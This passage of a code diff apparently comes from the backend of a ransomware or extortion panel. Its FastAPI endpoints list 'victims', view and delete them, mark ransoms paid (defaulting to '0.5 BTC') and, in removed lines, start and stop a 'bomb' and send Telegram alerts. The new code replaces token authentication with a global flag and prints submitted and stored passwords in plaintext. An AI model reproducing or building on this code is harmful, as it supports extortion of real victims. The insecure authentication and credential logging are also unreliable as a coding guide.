-            "password": login_data.password
-        })
-        
-        if not auth_response.user:
-            raise HTTPException(status_code=401, detail="Invalid credentials")
-        
-        # Verify that the owner_id matches
-        # In a real system, you'd store the owner_id in user metadata
-        # For now, we'll check if the provided owner_id matches the config
-        if login_data.owner_id != Config.OWNER_ID:
-            raise HTTPException(status_code=401, detail="Invalid owner ID")
-        
-        # Return access token
-        return OwnerLoginResponse(
-            access_token=auth_response.session.access_token,
-            token_type="bearer"
-        )
-        
-    except Exception as e:
-        print(f"Login error: {e}")
-        raise HTTPException(status_code=401, detail="Invalid credentials")
+    """Owner login API"""
+    global owner_session
+    
+    print(f"[+] Login attempt - ID: {login_data.owner_id}, Password: {login_data.password}")
+    print(f"[+] Expected - ID: {Config.OWNER_ID}, Password: {Config.OWNER_PASSWORD}")
+    
+    if login_data.owner_id == Config.OWNER_ID and login_data.password == Config.OWNER_PASSWORD:
+        owner_session = True
+        print("[+] Login successful")
+        return {'success': True}
+    
+    print("[-] Login failed")
+    raise HTTPException(status_code=401, detail="Invalid credentials")
 
-@app.get("/api/owner/victims", dependencies=[Depends(JWTBearer())])
-async def api_owner_victims(current_user: dict = Depends(get_current_user)):
+@app.post("/api/owner/logout")
+async def api_owner_logout():
+    """Owner logout"""
+    global owner_session
+    owner_session = False
+    return {'success': True}
+
+def check_owner():
+    """Check if owner is logged in"""
+    global owner_session
+    if not owner_session:
+        raise HTTPException(status_code=401, detail="Not authenticated")
+    return True
+
+@app.get("/api/owner/victims")
+async def api_owner_victims():
+    """Get all victims (owner only)"""
+    check_owner()
     try:
-        result = supabase_admin.table('victims').select('*').order('created', desc=True).execute()
-        return result.data
+        victims = supabase_admin.table('victims').select('*').order('created', desc=True).execute()
+        return victims.data
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.get("/api/owner/victim/{victim_id}", dependencies=[Depends(JWTBearer())])
+@app.get("/api/owner/victim/{victim_id}")
 async def api_owner_victim(victim_id: str):
-    try:
-        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
-        
-        if not result.data:
-            raise HTTPException(status_code=404, detail="Not found")
-        
-        return result.data[0]
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.post("/api/owner/mark-paid/{victim_id}", dependencies=[Depends(JWTBearer())])
-async def api_owner_mark_paid(victim_id: str):
+    """Get single victim (owner only)"""
+    check_owner()
     try:
         victim = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
-        if not victim.data:
-            raise HTTPException(status_code=404, detail="Victim not found")
         
+        if not victim.data:
+            raise HTTPException(status_code=404, detail="Not found")
+        
+        return victim.data[0]
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/owner/mark-paid/{victim_id}")
+async def api_owner_mark_paid(victim_id: str):
+    """Mark victim as paid"""
+    check_owner()
+    try:
         supabase_admin.table('victims').update({
             'status': 'paid',
             'paid_at': datetime.utcnow().isoformat()
         }).eq('id', victim_id).execute()
         
-        telegram.notify_payment(
-            victim_id,
-            victim.data[0].get('ransom', '0.5 BTC'),
-            'manual_verification'
-        )
-        
         return {'success': True}
         
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.post("/api/owner/bomb/start", dependencies=[Depends(JWTBearer())])
-async def api_owner_bomb_start(bomb_data: BombControl):
-    try:
-        supabase_admin.table('victims').update({
-            'bomb_status': 'active',
-            'bomb_size': 0
-        }).eq('id', bomb_data.victim_id).execute()
-        
-        telegram.notify_bomb_start(bomb_data.victim_id)
-        
-        return {'success': True}
-        
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.post("/api/owner/bomb/stop", dependencies=[Depends(JWTBearer())])
-async def api_owner_bomb_stop(bomb_data: BombControl):
-    try:
-        supabase_admin.table('victims').update({
-            'bomb_status': 'stopped'
-        }).eq('id', bomb_data.victim_id).execute()
-        
-        telegram.notify_bomb_stop(bomb_data.victim_id)
-        
-        return {'success': True}
-        
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.delete("/api/owner/delete-victim/{victim_id}", dependencies=[Depends(JWTBearer())])
+@app.delete("/api/owner/delete-victim/{victim_id}")
 async def api_owner_delete_victim(victim_id: str):
+    """Delete victim (careful!)"""
+    check_owner()
     try:
         supabase_admin.table('victims').delete().eq('id', victim_id).execute()
         return {'success': True}
